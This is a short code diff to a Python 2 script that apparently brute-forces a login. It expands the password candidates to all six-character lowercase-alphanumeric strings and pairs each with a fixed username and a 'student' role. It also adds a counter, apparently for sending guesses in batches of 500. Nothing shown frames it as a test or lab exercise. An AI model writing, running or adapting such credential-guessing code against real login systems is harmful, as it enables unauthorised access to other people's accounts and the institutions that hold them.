@@ -6,11 +6,12 @@ def do_something(response, *args, **kwargs):
 
 payloads = []
 counter = 0
-for ele in itertools.product("0123456",repeat=1):
+for ele in itertools.product("0123456789abcdefghijklmnopqrstuvwxyz",repeat=6):
     elements = "".join(ele)
     mayload = {'username': "512563", 'password': elements, 'role': "student"}
     print elements
     payloads.append(mayload)
+    counter += 1
     if (counter == 500):
         unsent_request = []
 
